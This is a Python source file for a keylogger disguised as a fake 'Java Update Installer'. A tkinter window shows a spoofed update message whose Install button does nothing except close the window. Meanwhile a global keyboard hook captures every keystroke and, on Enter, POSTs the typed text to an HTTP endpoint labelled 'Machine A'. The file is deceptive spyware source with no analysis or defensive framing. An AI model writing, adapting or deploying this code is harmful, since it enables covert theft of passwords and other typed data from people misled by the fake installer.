import aiohttp
import asyncio
import keyboard
import threading
import tkinter as tk
from PIL import Image, ImageTk
import io
import base64

async def sendNum(number, url, payload):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as response:
                if response.status == 200:
                    print(f"Number {number} sent successfully to Machine A")
                else:
                    print("Failed to send number to Machine A")
        except aiohttp.ClientError as e:
            print(f"Error sending number {number} to Machine A: {e}")

cur = []

def on_key_event(event):
    global cur
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'enter':
            asyncio.run(send())
        elif event.name == "space":
            cur.append(" ")
        elif event.name == "backspace":
            pass
        else:
            cur.append(event.name)

async def send():
    global cur
    url = "http://127.0.0.1:4000/"
    userInput = "".join(cur)
    payload = {"number": userInput}
    await sendNum(userInput, url, payload)
    cur = []

async def main():
    keyboard.on_press(on_key_event)
    await asyncio.sleep(float('inf'))

def gui():
    root = tk.Tk()
    root.title("Java Update Installer")
    root.geometry("500x300")

    base64_string = ""
    image_bytes = base64.b64decode(base64_string)
    java_logo = Image.open(io.BytesIO(image_bytes))
    java_logo = java_logo.resize((75, 75))
    java_logo = ImageTk.PhotoImage(java_logo)

    logo_label = tk.Label(root, image=java_logo)
    logo_label.pack(pady=10)

    message = ("Java Update Installer\n\n"
               "Welcome to the Java Update Installer!\n\n"
               "We're pleased to announce that a new version of Java is ready "
               "for installation on your system.\n\n"
               "This update includes important security enhancements and performance "
               "improvements.\n\n"
               "Please click 'Install' to begin the update process. Thank you!")
    message_label = tk.Label(root, text=message, padx=20, pady=10)
    message_label.pack()

    install_button = tk.Button(root, text="Install", command=root.destroy)
    install_button.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    threading.Thread(target=gui, daemon=True).start()
    asyncio.run(main())
